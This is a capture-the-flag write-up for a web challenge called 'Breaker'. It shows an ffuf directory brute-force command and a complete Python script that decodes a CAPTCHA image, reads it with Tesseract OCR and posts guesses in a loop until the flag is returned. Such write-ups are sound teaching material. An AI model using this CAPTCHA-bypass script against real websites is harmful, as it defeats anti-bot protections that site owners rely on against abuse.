# Breaker

Accessing the root of the challenge at: **http://141.85.224.118:8086/** …returned a vague message:

***"I'm a simple PHP file, try to reveal me :("***

This hinted at the existence of another PHP file responsible for the actual functionality.

## Directory brute-forcing

We ran a basic fuzzing scan to enumerate files:

```bash
ffuf -u http://141.85.224.118:8086/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt -e .php
```

This revealed the presence of:

```bash
/show.php [Status: 200]
/process.php [Status: 200]
```

## Visiting show.php
Going to: **http://141.85.224.118:8086/show.php** …showed a form with a CAPTCHA image and an input field.

```html
<img src="data:image/png;base64,..."/>
<form action="process.php" method="POST">
  <input name="txt_input">
</form>
```

First wee tried manually typing the recaptcha code but we got a response of *too late* so probably we had to make a script that solves it as fast as possible, or at leaster faster than manual.

## Exploit script
```python
import requests
from bs4 import BeautifulSoup
import base64
from PIL import Image, ImageOps, ImageFilter
import pytesseract
from io import BytesIO
import time

URL = "http://141.85.224.118:8086/show.php"
POST_URL = "http://141.85.224.118:8086/process.php"

session = requests.Session()


def preprocess_image(img_data):
    image = Image.open(BytesIO(img_data)).convert("L")
    image = image.resize((image.width * 2, image.height * 2))
    image = ImageOps.autocontrast(image)
    image = image.filter(ImageFilter.MedianFilter())
    image = image.point(lambda x: 0 if x < 140 else 255, '1')
    return image


while True:
    try:
        resp = session.get(URL)
        soup = BeautifulSoup(resp.text, "html.parser")

        img_tag = soup.find("img")
        base64_data = img_tag['src'].split(",")[1]
        captcha_image = base64.b64decode(base64_data)

        processed_img = preprocess_image(captcha_image)

        captcha_text = pytesseract.image_to_string(
            processed_img,
            config=
            '--psm 7 -c tessedit_char_whitelist=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789'
        ).strip()

        print(f"[>] Trying: {captcha_text}")

        data = {"txt_input": captcha_text, "submit": "Send"}

        res = session.post(POST_URL, data=data)

        if "wrong" not in res.text:
            print("\nSuccess!")
            print(res.text)
            break
        else:
            print("Wrong, retrying...\n")
            time.sleep(1)

    except Exception as e:
        print(f"[!] Error: {e}")
        time.sleep(1)
```
        
After a few attempts (due to minor OCR inconsistencies), the script successfully solved the CAPTCHA and received the flag in the HTML response.
